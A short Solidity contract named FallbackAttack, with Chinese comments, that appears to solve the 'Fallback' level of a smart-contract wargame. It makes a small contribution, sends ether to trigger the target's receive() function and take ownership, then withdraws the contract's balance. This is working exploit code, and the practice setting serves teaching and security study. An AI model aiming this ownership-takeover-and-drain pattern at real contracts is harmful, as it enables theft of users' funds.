// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../../interfaces/IFallback.sol";

contract FallbackAttack {
    IFallback target;

    constructor(address _target) {//这里的_target是Fallback合约的地址
        target = IFallback(_target);
    }

    function attack() public payable {
        // Step 1: 成为 contributor
        target.contribute{value: 0.0001 ether}();

        // Step 2: 触发 receive()
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "call failed");

        // Step 3: 提现
        target.withdraw();
    }

    receive() external payable {}
}